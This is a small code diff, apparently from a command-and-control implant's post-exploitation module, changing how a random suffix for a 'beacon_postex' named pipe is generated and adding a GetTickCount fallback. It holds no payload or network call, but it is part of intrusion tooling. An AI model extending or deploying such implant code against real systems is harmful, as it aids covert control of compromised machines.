@@ -45,7 +45,9 @@ BOOL PostExBuildPipeName(struct BeaconContext* ctx, UINT32 task_id,
     UINT32 suffix;
 
     if (!ctx || !out || out_size == 0) return FALSE;
-    suffix = CryptoRandomU32();
+    if (!CryptoRandomU32(&suffix)) {
+        suffix = GetTickCount();
+    }
     return _snprintf_s(out, out_size, _TRUNCATE,
                        "\\\\.\\pipe\\beacon_postex_%08lx_%08lx_%08lx",
                        (ULONG)ctx->beacon_id,
